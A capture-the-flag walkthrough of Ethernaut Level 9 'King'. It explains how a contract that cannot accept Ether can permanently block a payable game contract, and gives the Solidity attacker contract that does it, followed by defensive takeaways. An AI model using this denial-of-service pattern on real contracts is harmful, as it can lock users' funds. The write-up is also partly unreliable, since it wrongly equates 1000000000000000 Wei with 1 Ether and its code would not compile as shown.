# Level 9 : King

**Ethernaut Level 9 : King :** 

Fallback function : receive() (present here) and send()

Each time your contract sends Ethers to another contract, **you are depending on the other contract’s code to handle the transaction and determine the transaction’s success**.

—> Your valid transactions can arbitrarily fail.

As the transaction sender, you are always susceptible to the following cases:

- **Loophole 1: The receiving contract doesn’t have a payable fallback function, cannot receive Ethers, and will throw an error upon a payable request.**
- **Loophole 2: The receiving contract has a malicious payable fallback function that throws an exception and fails valid transactions.**
- **Loophole 3: The receiving contract has a malicious payable function that consumes a large amount of gas, which fails your transaction or over-consumes your gas limit.**

—> Notice inside this fallback function, there is a `king.transfer()`, which can fail if the current king is a malicious contract and refuses to withdraw.

—> Let's make a contract `ForeverKing` that has NO `receive` or `fallback`

—> The current prize of Ethernaut Contract can be obtained like this : `await contract.prize().then(v => v.toString())` ⇒ 1000000000000000 Wei (1 Eth)

—> Make sure to implement a function payable allowing us to send some ether while deploying the contract. This function will trigger the `receive()` function of King Contract. The `msg.value` is set to prize which are dynamically fetching from the contract.

—> Don’t forget (easy one) to not implement `receive()` or `fallback()` function so that no one can send Ether on it. There are plenty of ways to do it like implement one of these functions and added a `revert` statement on it but why more efforts ? be lazy ! 

—>Claim ownership requesting king and  Sending 1 eth to contract and then submit instance , with no fallback you will stay king 👑.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";

contract Newking{
    address payable addr_ = payable(address(//Ethernaut Contract Address));
    King level9 = King(addr_);

    function becomeKingAndStay() public payable{
      address(level9).call{value: level9.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize
    }
}

contract King {
  address king;
  uint public prize;
  address public owner;
  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }
  receive() external payable {}
  function _king() public view returns (address) {
    return king;
  }
}
```

# **Key Security Takeaways**

- Never assume transactions to external contracts will be successful
- Make sure to handle failed transactions on the client side in the event you do depend on transaction success to execute other core logic